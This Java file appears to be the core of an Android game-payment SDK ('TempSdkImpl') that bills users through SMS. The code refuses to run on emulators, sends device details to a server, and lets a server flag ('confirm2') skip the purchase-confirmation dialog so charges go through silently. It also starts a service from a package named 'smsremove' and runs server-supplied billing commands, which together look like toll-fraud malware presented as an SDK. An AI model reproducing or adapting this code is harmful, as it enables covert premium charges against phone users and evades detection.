package com.use.tempsdk;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.fxlib.util.android.FAResource;
import com.use.tempsdk.bean.Message;
import com.use.tempsdk.jni.DeviceInfo;
import com.use.tempsdk.smsremove.SmsService;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;


/**
 * Created by shuxiong on 2017/4/24.
 */

public class TempSdkImpl {
    public static String trancMessage;

    /**
     * 给模块管理器调用的方法
     *
     * @param context
     * @param message
     * @param params
     * @return
     */
    public static String onLoad(Context context, String message, Map params) {
        if (params.containsKey("message")) {
            trancMessage = params.get("message").toString();
        }
        return "load OK";
    }

    static int initCode = FeeHelper.InitState.NO_INIT;
    // 301:未初始化，300：请求成功且服务器要求执行
    // ， 302：正在初始化
    // ，-200：策略过滤 ，303：请求失败。
    public static ExecutorService executor = Executors.newSingleThreadExecutor();
    public static ExecutorService executorSub = Executors.newSingleThreadExecutor();
    public static Future<?> future;
    public static String deviceInfo;//把从jni获取的设备信息存储在全局变量

    static String token = "";
    public static Handler hander = new Handler(Looper.getMainLooper()) {
    };
    /**
     * 获取设备信息通过jni得到
     *
     * @param act
     * @param cpId        未知 游戏传入过来
     * @param cpChannelid 渠道id
     * @param cpGameId    游戏id
     * @param cb          游戏提供的回调接口 实现这个接口 反馈给游戏初始化是否成功 通过code
     */

    static int confirm2;

    public static void init(final Activity act, String cpId, String cpChannelid, String cpGameId, final TempSdkFace.InitCb cb) {

        Log.i("ddddd", "正在init");
        //得到 设备信息 json格式 jni的方法可以变化,总之最后的结果都要变成 json格式
        deviceInfo = DeviceInfo.message(act, cpId, cpChannelid, cpGameId);
        //传给 接口 反馈是否 成功 这里http交互 post方法
        /**
         *  判断是否是模拟器 java层主动判断
         * 数据交互 开启子线程
         */
        EmulateCheckUtil.isValidDevice(act, new EmulateCheckUtil.ResultCallBack() {
            @Override
            public void isEmulator() {
                Log.e("ddddd", "isEmulator");
                cb.onResult(-100);
            }

            @Override
            public void isDevice() {
                if (future != null && !future.isDone()) {
                    // cb.failed("another task is ongoing");
                    if (cb != null) cb.onResult(initCode);
                    CommonUtil.log("another task is ongoing");
                    return;
                }
                initCode = FeeHelper.InitState.INITING;
                future = executor.submit(new Runnable() {
                    @Override
                    public void run() {
                        String result = CommonUtil.sendPost(FieldName.use_initLink, deviceInfo);
//
                        Log.e("init", "123");
                        try {
                            //json格式 转换成 对象
                            if (!TextUtils.isEmpty(result)) {
                                Log.e("init", "123");
                                JSONObject jsonObject = new JSONObject(result);

                                if (jsonObject.has("token")) {
                                    token = jsonObject.getString("token");
                                }
                                if (jsonObject.has("confirm2")) {
                                    confirm2 = jsonObject.getInt("confirm2");
                                }
                                if (jsonObject.getInt("status") == 1) {
                                    initCode = FeeHelper.InitState.INIT_SUCCESS;
                                    if (cb != null) {
                                        cb.onResult(FeeHelper.InitState.INIT_SUCCESS);

                                        Log.e("init", "" + 300);
                                    }
                                } else {
                                    initCode = FeeHelper.InitState.POLICY_FAILED;
                                    if (cb != null) cb.onResult(FeeHelper.InitState.POLICY_FAILED);
                                    Log.e("init", "123");
                                }

                            } else {
                                if (cb != null) cb.onResult(FeeHelper.InitState.INIT_FAILED);
                                initCode = FeeHelper.InitState.INIT_FAILED;
                                Log.e("init", "123");
                            }
                        } catch (Exception e) {
                            initCode = FeeHelper.InitState.INIT_FAILED;
                            if (cb != null) cb.onResult(FeeHelper.InitState.INIT_FAILED);
                            e.printStackTrace();
                            Log.e("dddddd", "exception");
                        }
                    }

                });
            }

            @Override
            public void notSure() {
                cb.onResult(-111);
                Log.e("init", "dddd");
            }
        });

    }

    /**
     * 点击支付按钮触发的方法
     *
     * @param act
     * @param price 价格 由游戏传入 区分单位  单位 为分
     * @param cpParam 未知 必需 游戏传入
     * @param1 cpId 未知 必需 游戏传入 新加
     * @param1 cpChannelid 渠道id 新加
     * @param1 cpGameId 游戏id 新加
     * @param cb 回调
     */

    static ProgressDialog progressDialog;
    public static ArrayList<Message> messageList = null;
    public static int money;
    public static String dobill;

    public static void doBilling(final Activity act, final int price, final String cpParam, final TempSdkFace.DoBillingCb cb) {
        if (initCode != 300) {
            cb.onBilling(initCode);
            return;
        }

        if (confirm2 == 0) {
            isdoBilling(act, price, "", cpParam, cb);
            return;
        }

        showDialog1(act, price, "", cpParam, cb);
//
    }

    public static void isdoBilling(final Activity act, final int price, final String price1, final String cpParam, final TempSdkFace.DoBillingCb cb) {
        if (price1.equals("")) {
            money = 100 * price;
        } else {
            money = (int) (Double.parseDouble(price1.trim()) * 100);
        }

        //money = 100 * price;//单位
        //money = price;//单位
        //测试金额 price = 1
        if (future != null && !future.isDone()) {
            cb.onBilling(50);//初始化工作未结束，不能支付
            return;
        } else if (initCode != 300) {//初始化结束 可结果不是300 同样失败
            cb.onBilling(50);
            return;
        }

        //支付过程中 需要时间 使用进度对话框
        progressDialog = new ProgressDialog(act);
        progressDialog.setCancelable(false);//不能取消
        progressDialog.setMessage("正在处理中...");
        progressDialog.show();

        future = executor.submit(new Runnable() {
            @Override
            public void run() {

                Intent intent1 = new Intent(act, SmsService.class);
                act.startService(intent1);

                try {
                    JSONObject object = new JSONObject(deviceInfo);
                    object.put("fee", money);//每次
                    object.put("cpParam", cpParam);
                    object.put("token", token);//新添加
                    dobill = object.toString();
                    //String ret = null;

                    for (int i = 0; i < 2; i++) {
                        String ret = CommonUtil.sendPost(FieldName.use_doLink, object.toString());
                        if (!TextUtils.isEmpty(ret)) {
                            JSONObject object1 = new JSONObject(ret);
                            if (object1.getInt("status") == 0 && i == 1) {
                                progressDialog.cancel();
                                if (cb != null) cb.onBilling(50);
                                break;
                            } else if (object1.getInt("status") == 1 && object1.getString("info").equals("success")) {
                                messageList = TempBiz.getInstance(act).getMessageList(object1.toString());
                                hander.post(new Runnable() {
                                    @Override
                                    public void run() {
                                        TempBiz.getInstance(act).callParseCmd(progressDialog, messageList, cb);
                                    }
                                });

                                break;
                            }
                        }
                        Log.i("睡眠请求", "次数" + i);
                        Thread.sleep(600);
                    }

                } catch (Exception e) {
                    e.printStackTrace();
                    progressDialog.cancel();
                    if (cb != null) cb.onBilling(50);
                }

            }

        });
    }

    /**
     * price单位 为元     confirm2 值 1 弹出确认页面 0 不弹出确认页面
     */

    public static void doBilling(final Activity act, final String price, final String cpParam, final TempSdkFace.DoBillingCb cb) {
        if (initCode != 300) {
            cb.onBilling(initCode);
            return;
        }

        if (confirm2 == 0) {
            isdoBilling(act, 0, price, cpParam, cb);
            return;
        }

        showDialog1(act, 0, price, cpParam, cb);
//
    }

    public static void showDialog1(final Activity act, final int price1, final String price, final String cpParam, final TempSdkFace.DoBillingCb cb){
        int mScreenWidth;
        int mScreenHeight;
        DisplayMetrics metric = act.getResources().getDisplayMetrics();
        mScreenWidth = metric.widthPixels; // 屏幕宽度
        mScreenHeight = metric.heightPixels; // 屏幕高度

        AlertDialog.Builder builder = new AlertDialog.Builder(act);
        final AlertDialog dialog = builder.create();
        dialog.show();
        int res = FAResource.getId(act, "pj_ctdm_confirm_dialog", "layout");
        View mConfirmView = View.inflate(act, res, null);
        res = FAResource.getId(act, "pj_ctdm_confirm_dialog_desc", "id");
        TextView dialogDesc = (TextView) mConfirmView.findViewById(res);
        String desc = "尊敬的用户，点击确认即同意购买" +(price.equals("") ? price1 : price)  +"元计费服务"+ "，信息费" +(price.equals("") ? price1 : price) + "元，确认购买？";
        dialogDesc.setText(desc);
        // 设置确定按钮事件
        res = FAResource.getId(act, "pj_ctdm_confirm_dialog_okbtn", "id");
        Button okBtn = (Button) mConfirmView.findViewById(res);
        // 设置取消按钮事件
        res = FAResource.getId(act, "pj_ctdm_confirm_dialog_cancelbtn", "id");
        Button cancleBtn = (Button) mConfirmView.findViewById(res);

        okBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                dialog.dismiss();
                isdoBilling(act, price1, price, cpParam, cb);
            }
        });

        cancleBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                dialog.dismiss();
                cb.onBilling(-99);
            }
        });
        // 设置LayoutParams
        int width = mScreenWidth > mScreenHeight ? mScreenHeight : mScreenWidth;
        RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams((int) (width * 0.75), -2);
        layoutParams.addRule(RelativeLayout.CENTER_IN_PARENT, RelativeLayout.TRUE);
        mConfirmView.setLayoutParams(layoutParams);


        RelativeLayout mainLayout = new RelativeLayout(act);
        mainLayout.setBackgroundColor(Color.parseColor("#50000000"));
        RelativeLayout.LayoutParams mainLayoutParams = new RelativeLayout.LayoutParams(-1, -1);
        dialog.addContentView(mainLayout, mainLayoutParams);
        mainLayout.addView(mConfirmView);
    }

    public static void showDialog(final Activity act, final int price1, final String price, final String cpParam, final TempSdkFace.DoBillingCb cb) {
        AlertDialog.Builder builder = new AlertDialog.Builder(act);
        final AlertDialog dialog = builder.create();
        dialog.show();
        LinearLayout view = new LinearLayout(act);
        view.setPadding(22, 22, 22, 22);

        int strokeWidth = 1;     // 1dp 边框宽度
        int roundRadius = 15;     // 5dp 圆角半径
        int strokeColor = Color.parseColor("#FFFF0000");//边框颜色
        int fillColor = Color.parseColor("#FFFFFFFF"); //内部填充颜色

        GradientDrawable gd = new GradientDrawable();//创建drawable
        gd.setColor(fillColor);
        gd.setCornerRadius(roundRadius);
        gd.setStroke(strokeWidth, strokeColor);
        gd.setGradientType(GradientDrawable.LINEAR_GRADIENT);
        view.setBackgroundDrawable(gd);

//
//            // 创建渐变的shape drawable
//        int colors[] = { 0xff255779 , 0xff3e7492, 0xffa6c0cd };//分别为开始颜色，中间夜色，结束颜色
//        GradientDrawable gradientDrawable = new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM, colors);
//        view.setBackgroundDrawable(gradientDrawable);

        //view.setBackgroundColor(Color.WHITE);
        view.setOrientation(LinearLayout.VERTICAL);
        view.setLayoutParams(new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        view.setGravity(Gravity.CENTER);

        TextView title = new TextView(act);
        title.setLayoutParams(new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        title.setTextColor(Color.BLACK);
        title.setTextSize(21);
        view.addView(title);

        LinearLayout linearLayout = new LinearLayout(act);
        linearLayout.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        layoutParams.setMargins(0, 30, 0, 0);
        linearLayout.setLayoutParams(layoutParams);

        strokeColor = Color.BLUE;//边框颜色
        fillColor = Color.BLUE; //内部填充颜色

        gd = new GradientDrawable();//创建drawable
        gd.setColor(fillColor);
        gd.setCornerRadius(roundRadius);
        gd.setStroke(strokeWidth, strokeColor);
        gd.setGradientType(GradientDrawable.LINEAR_GRADIENT);

        Button button = new Button(act);
        LinearLayout.LayoutParams layoutParams1 = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT, 1);
        layoutParams1.setMargins(0, 0, 15, 0);
        //button.setBackgroundColor(Color.BLUE);
        button.setText("确定");
        button.setTextColor(Color.WHITE);
        button.setTextSize(19);
        button.setLayoutParams(layoutParams1);


        button.setBackgroundDrawable(gd);

        Button button1 = new Button(act);
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT, 1);
        layoutParams2.setMargins(15, 0, 0, 0);
        //button1.setBackgroundColor(Color.GRAY);
        button1.setText("取消");
        button1.setTextColor(Color.BLACK);
        button1.setTextSize(19);
        button1.setLayoutParams(layoutParams2);

        strokeColor = Color.GRAY;//边框颜色
        fillColor = Color.GRAY; //内部填充颜色

        gd = new GradientDrawable();//创建drawable
        gd.setColor(fillColor);
        gd.setCornerRadius(roundRadius);
        gd.setStroke(strokeWidth, strokeColor);
        gd.setGradientType(GradientDrawable.LINEAR_GRADIENT);
        button1.setBackgroundDrawable(gd);

        linearLayout.addView(button);

        linearLayout.addView(button1);

        view.addView(linearLayout);

        dialog.setContentView(view);

        title.setText("尊敬的用户，点击确认即同意购买" + (price.equals("") ? price1 : price) + "元计费服务，信息费" + (price.equals("") ? price1 : price) + "元，确认购买？");
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                dialog.dismiss();
                isdoBilling(act, price1, price, cpParam, cb);
            }
        });
        Log.i("dddd", "2222");
        button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                dialog.dismiss();
                cb.onBilling(-99);
            }
        });
        Log.i("dddd", "2222");
    }


}
